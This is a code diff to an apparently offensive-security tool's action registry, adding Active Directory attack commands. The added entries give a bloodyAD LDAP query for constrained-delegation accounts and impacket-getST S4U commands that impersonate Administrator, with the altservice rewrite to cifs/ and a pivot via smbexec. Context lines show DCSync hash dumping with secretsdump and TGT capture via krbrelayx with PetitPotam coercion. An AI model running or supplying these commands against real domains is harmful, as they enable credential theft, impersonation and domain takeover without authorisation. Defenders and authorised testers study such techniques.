@@ -408,6 +408,24 @@ ACTION_REGISTRY: dict[str, Action] = {
         ["impacket-secretsdump -just-dc $DOMAIN/<USER>:<PASS>@$IP"],
         risk="propose", runnable=False, outputs="raw",
         note="DCSync the DC (principal has replication rights); dumps NTDS hashes -> DA."),
+    "ldap_find_constrained_delegation": _a("ldap_find_constrained_delegation",
+        ["bloodyAD -u <USER> -p '<PASS>' -d $DOMAIN --host $IP get search "
+         "--filter '(&(objectCategory=Computer)"
+         "(userAccountControl:1.2.840.113556.1.4.803:=16777216))' "
+         "--attr sAMAccountName,msds-allowedtodelegateto"],
+        runnable=False, outputs="raw",
+        note="Find accounts trusted for constrained delegation (TRUSTED_TO_AUTH_FOR_DELEGATION); "
+             "msds-allowedtodelegateto lists the SPNs they can delegate to."),
+    "constrained_delegation_s4u": _a("constrained_delegation_s4u",
+        ["# S4U2self+S4U2proxy: impersonate Administrator to an allowed SPN, then pivot service:",
+         "impacket-getST -spn 'HOST/target.$DOMAIN' -impersonate Administrator "
+         "-dc-ip $IP '$DOMAIN/<DELEG_ACCT>:<PASS>'",
+         "# altservice trick: a ticket to time/ can be rewritten to cifs/ (any SPN on that host):",
+         "impacket-getST -spn 'time/target.$DOMAIN' -altservice cifs -impersonate Administrator "
+         "-dc-ip $IP '$DOMAIN/<DELEG_ACCT>:<PASS>'  # then KRB5CCNAME + smbexec"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Constrained delegation abuse: the allowed SPN's service part is not enforced in the "
+             "ticket, so a time/ delegation still yields cifs/host/ldap on the target."),
     "unconstrained_delegation_capture": _a("unconstrained_delegation_capture",
         ["# Coerce DC auth to the unconstrained host, capture the TGT:",
          "python3 krbrelayx.py -t ldap://$IP  # + PetitPotam/printerbug coercion",
